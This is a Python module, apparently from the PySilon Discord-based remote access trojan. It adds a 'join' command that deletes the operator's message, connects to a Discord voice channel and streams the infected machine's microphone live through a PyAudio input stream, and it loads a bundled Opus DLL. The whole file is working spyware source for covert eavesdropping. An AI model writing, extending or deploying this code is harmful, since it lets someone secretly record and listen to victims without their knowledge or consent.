import resources.modules.misc as pysilon_misc
import pyaudio
import sys
import os

@client.command(name="join")
async def live_mic(ctx):
    await ctx.message.delete()
    vc = await client.get_channel(channel_ids['voice']).connect(self_deaf=True)
    vc.play(PyAudioPCM())
    await ctx.send('`[' + pysilon_misc.current_time() + '] Joined voice-channel and streaming microphone in realtime`')

bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
opuslib_path = os.path.abspath(os.path.join(bundle_dir, 'modules/libopus-0.x64.dll'))
discord.opus.load_opus(opuslib_path)
class PyAudioPCM(discord.AudioSource):
    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
        #.log Started PyAudioPCM class 
        p = pyaudio.PyAudio()
        #.log Initialized PyAudio 
        self.chunks = chunk
        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
        #.log Started streaming the audio 
    def read(self) -> bytes:
        return self.input_stream.read(self.chunks)
